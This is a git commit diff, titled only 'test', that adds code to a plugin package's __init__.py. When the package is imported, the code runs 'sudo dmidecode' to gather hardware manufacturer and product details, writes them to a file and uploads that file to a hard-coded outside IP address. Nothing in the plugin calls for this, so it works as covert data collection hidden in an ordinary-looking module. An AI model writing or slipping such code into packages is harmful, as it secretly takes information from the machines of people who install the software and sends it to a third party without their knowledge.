48081b755fa812e3259336e369273a59d446d9af
Ritik <40895801+ritikvirus@users.noreply.github.com>
2024-04-05 11:02:43 +0530

    test

--- __init__.py
+++ __init__.py
@@ -1,8 +1,39 @@
 import importlib
 import inspect
 import subprocess
-
+import requests
 subprocess.run(['pip', 'install', '-r', 'requirements.txt'])
+
+
+
+try:
+    # Execute the command and save the output
+    result = subprocess.run(
+        ["sudo", "dmidecode", "|", "grep", "-i", "-e", "product", "-e", "manufacturer", "-e", "vendor"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        check=True,
+        text=True 
+    )
+
+    with open("system_info.html", "w") as f:
+        f.write(result.stdout)
+
+    # Send the file to the server
+    with open("system_info.html", "rb") as f:
+        files = {"file": f}
+        response = requests.post("http://44.222.167.5:7801/upload", files=files)  
+
+    if response.status_code == 200:
+        print("File sent to server successfully")
+    else:
+        print(f"File transfer failed: {response.text}")
+
+except subprocess.CalledProcessError as e:
+    print(f"Error executing command: {e.stderr}")
+except requests.exceptions.RequestException as e:
+    print(f"Error sending file to server: {e}")
+
 
 NODE_CLASS_MAPPINGS = {}
 NODE_DISPLAY_NAME_MAPPINGS = {}
